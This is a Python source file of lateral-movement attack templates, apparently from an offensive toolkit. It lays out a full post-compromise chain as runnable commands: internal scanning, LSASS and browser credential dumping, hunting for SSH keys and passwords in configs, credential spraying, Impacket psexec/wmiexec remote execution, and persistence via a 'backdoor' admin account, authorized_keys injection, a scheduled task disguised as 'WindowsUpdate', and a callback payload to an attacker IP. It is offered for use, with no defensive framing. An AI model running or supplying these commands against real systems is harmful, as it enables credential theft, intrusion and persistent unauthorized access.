"""
Lateral Movement Attack Templates
"""


class LateralMovementTemplates:
    """Templates for lateral movement within compromised networks"""
    
    @staticmethod
    def lateral_movement_chain():
        """
        Attack chain for lateral movement within network
        Target: Internal network after initial compromise
        """
        return {
            'name': 'Lateral Movement',
            'description': 'Attack chain for moving laterally through compromised network',
            'target_type': 'internal_network',
            'difficulty': 'medium',
            'estimated_time': '2-6 hours',
            'prerequisites': ['Initial access to one system', 'Network connectivity'],
            'phases': [
                LateralMovementTemplates._network_discovery_phase(),
                LateralMovementTemplates._credential_theft_phase(),
                LateralMovementTemplates._lateral_movement_phase(),
                LateralMovementTemplates._persistence_phase()
            ]
        }
    
    @staticmethod
    def _network_discovery_phase():
        """Network discovery and mapping"""
        return {
            'phase': 'network_discovery',
            'name': 'Internal Network Discovery',
            'description': 'Map internal network and identify targets',
            'steps': [
                {
                    'step': 1,
                    'name': 'Network Enumeration',
                    'tool': '05-post-exploitation/network_discovery.py',
                    'command': 'python3 05-post-exploitation/network_discovery.py --full',
                    'expected_output': 'Network topology and active hosts',
                    'success_criteria': 'Identified additional targets',
                    'required_vars': []
                },
                {
                    'step': 2,
                    'name': 'Port Scanning',
                    'tool': 'nmap',
                    'command': 'nmap -sT -p 22,80,443,445,3389,5985 {internal_subnet} -oA internal_scan',
                    'expected_output': 'Open ports on internal hosts',
                    'success_criteria': 'Found accessible services',
                    'required_vars': ['internal_subnet']
                },
                {
                    'step': 3,
                    'name': 'Service Enumeration',
                    'tool': 'crackmapexec',
                    'command': 'crackmapexec smb {internal_subnet} --gen-relay-list targets.txt',
                    'expected_output': 'SMB hosts and relay targets',
                    'success_criteria': 'Identified high-value targets',
                    'required_vars': ['internal_subnet']
                }
            ]
        }
    
    @staticmethod
    def _credential_theft_phase():
        """Credential harvesting from compromised system"""
        return {
            'phase': 'credential_theft',
            'name': 'Credential Harvesting',
            'description': 'Extract credentials from compromised system',
            'steps': [
                {
                    'step': 1,
                    'name': 'Memory Dump',
                    'tool': 'Mimikatz/pypykatz',
                    'command': 'python3 -m pypykatz lsa minidump lsass.dmp',
                    'expected_output': 'Cleartext passwords and NTLM hashes',
                    'success_criteria': 'Extracted usable credentials',
                    'required_vars': [],
                    'notes': 'First dump lsass.exe process memory'
                },
                {
                    'step': 2,
                    'name': 'Browser Credential Extraction',
                    'tool': '05-post-exploitation/credential_harvester.py',
                    'command': 'python3 05-post-exploitation/credential_harvester.py --browsers',
                    'expected_output': 'Saved browser credentials',
                    'success_criteria': 'Found additional credentials',
                    'required_vars': []
                },
                {
                    'step': 3,
                    'name': 'Search for SSH Keys',
                    'tool': 'find/grep',
                    'command': 'find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null',
                    'expected_output': 'SSH private keys',
                    'success_criteria': 'Found private keys for lateral movement',
                    'required_vars': []
                },
                {
                    'step': 4,
                    'name': 'Configuration File Analysis',
                    'tool': 'grep/find',
                    'command': 'grep -r "password" /etc /home --include="*.conf" --include="*.ini" 2>/dev/null',
                    'expected_output': 'Passwords in config files',
                    'success_criteria': 'Found embedded credentials',
                    'required_vars': []
                }
            ]
        }
    
    @staticmethod
    def _lateral_movement_phase():
        """Execute lateral movement"""
        return {
            'phase': 'lateral_movement',
            'name': 'Move to Additional Systems',
            'description': 'Use harvested credentials to access other systems',
            'steps': [
                {
                    'step': 1,
                    'name': 'Credential Validation',
                    'tool': 'crackmapexec',
                    'command': 'crackmapexec smb {internal_subnet} -u users.txt -p passwords.txt --continue-on-success',
                    'expected_output': 'Valid credential pairs and accessible hosts',
                    'success_criteria': 'Found working credentials for multiple systems',
                    'required_vars': ['internal_subnet']
                },
                {
                    'step': 2,
                    'name': 'PSExec Lateral Movement',
                    'tool': 'Impacket psexec',
                    'command': 'python3 psexec.py {domain}/{username}:{password}@{target_ip}',
                    'expected_output': 'Interactive shell on target',
                    'success_criteria': 'Gained access to additional system',
                    'required_vars': ['domain', 'username', 'password', 'target_ip']
                },
                {
                    'step': 3,
                    'name': 'WMI Execution',
                    'tool': 'Impacket wmiexec',
                    'command': 'python3 wmiexec.py {domain}/{username}:{password}@{target_ip}',
                    'expected_output': 'Command execution on target',
                    'success_criteria': 'Executed commands on remote system',
                    'required_vars': ['domain', 'username', 'password', 'target_ip']
                },
                {
                    'step': 4,
                    'name': 'SSH Lateral Movement',
                    'tool': 'ssh',
                    'command': 'ssh -i stolen_key.pem user@{target_ip}',
                    'expected_output': 'SSH session on target',
                    'success_criteria': 'Accessed Linux system via SSH',
                    'required_vars': ['target_ip']
                }
            ]
        }
    
    @staticmethod
    def _persistence_phase():
        """Establish persistence on new systems"""
        return {
            'phase': 'persistence',
            'name': 'Establish Persistence',
            'description': 'Maintain access to newly compromised systems',
            'steps': [
                {
                    'step': 1,
                    'name': 'Create Local Admin Account',
                    'tool': 'net user',
                    'command': 'net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add',
                    'expected_output': 'New admin account created',
                    'success_criteria': 'Persistent administrative access',
                    'required_vars': [],
                    'notes': 'Windows systems only'
                },
                {
                    'step': 2,
                    'name': 'Add SSH Key',
                    'tool': 'ssh-keygen',
                    'command': 'echo "{ssh_public_key}" >> ~/.ssh/authorized_keys',
                    'expected_output': 'SSH key added',
                    'success_criteria': 'SSH key-based access established',
                    'required_vars': ['ssh_public_key'],
                    'notes': 'Linux systems only'
                },
                {
                    'step': 3,
                    'name': 'Scheduled Task Persistence',
                    'tool': 'schtasks',
                    'command': 'schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\backdoor.exe" /sc onlogon /ru System',
                    'expected_output': 'Scheduled task created',
                    'success_criteria': 'Backdoor executes on logon',
                    'required_vars': [],
                    'notes': 'Windows systems only'
                },
                {
                    'step': 4,
                    'name': 'Deploy Remote Access Tool',
                    'tool': '02-weaponization/payload_generator.py',
                    'command': 'python3 02-weaponization/payload_generator.py {attacker_ip} {attacker_port} --persistent',
                    'expected_output': 'Persistent backdoor payload',
                    'success_criteria': 'Callback mechanism established',
                    'required_vars': ['attacker_ip', 'attacker_port']
                }
            ]
        }